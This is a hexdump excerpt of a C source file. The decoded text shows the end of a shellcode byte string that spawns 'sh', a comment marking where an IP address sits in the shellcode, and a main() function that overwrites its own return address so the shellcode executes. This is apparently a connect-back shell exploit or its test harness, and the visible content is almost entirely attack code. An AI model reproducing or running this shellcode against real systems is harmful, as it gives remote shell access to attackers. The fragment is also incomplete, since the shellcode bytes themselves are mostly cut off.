000012a0  78 37 33 5c 78 36 38 22  3b 09 09 09 09 20 20 20  |x73\x68";....   |
000012b0  20 5e 0d 0a 09 09 09 09  09 09 20 20 20 20 20 20  | ^........      |
000012c0  20 20 20 20 20 20 20 53  74 61 72 74 20 6f 66 20  |       Start of |
000012d0  49 50 20 61 64 64 72 0d  0a 76 6f 69 64 20 6d 61  |IP addr..void ma|
000012e0  69 6e 28 29 20 7b 0d 0a  20 20 20 20 20 20 20 20  |in() {..        |
000012f0  69 6e 74 20 2a 72 65 74  3b 0d 0a 0d 0a 20 20 20  |int *ret;....   |
00001300  20 20 20 20 20 72 65 74  20 3d 20 28 69 6e 74 20  |     ret = (int |
00001310  2a 29 26 72 65 74 20 2b  20 32 3b 0d 0a 20 20 20  |*)&ret + 2;..   |
00001320  20 20 20 20 20 28 2a 72  65 74 29 20 3d 20 28 69  |     (*ret) = (i|
00001330  6e 74 29 73 68 65 6c 6c  63 6f 64 65 3b 0d 0a 7d  |nt)shellcode;..}|
00001340
